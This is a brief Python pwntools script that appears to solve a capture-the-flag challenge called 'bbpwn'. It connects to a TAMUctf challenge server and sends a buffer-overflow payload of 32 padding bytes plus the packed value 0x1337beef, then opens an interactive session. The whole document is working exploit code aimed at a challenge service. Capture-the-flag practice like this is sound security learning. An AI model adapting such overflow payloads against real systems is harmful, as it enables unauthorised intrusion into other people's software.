from pwn import *

io = remote('challenges.tamuctf.com', 4252)
#io = process('./bbpwn')

s = io.recvuntil(':')
print s

io.sendline("A"*32+p32(0x1337beef))

io.interactive()
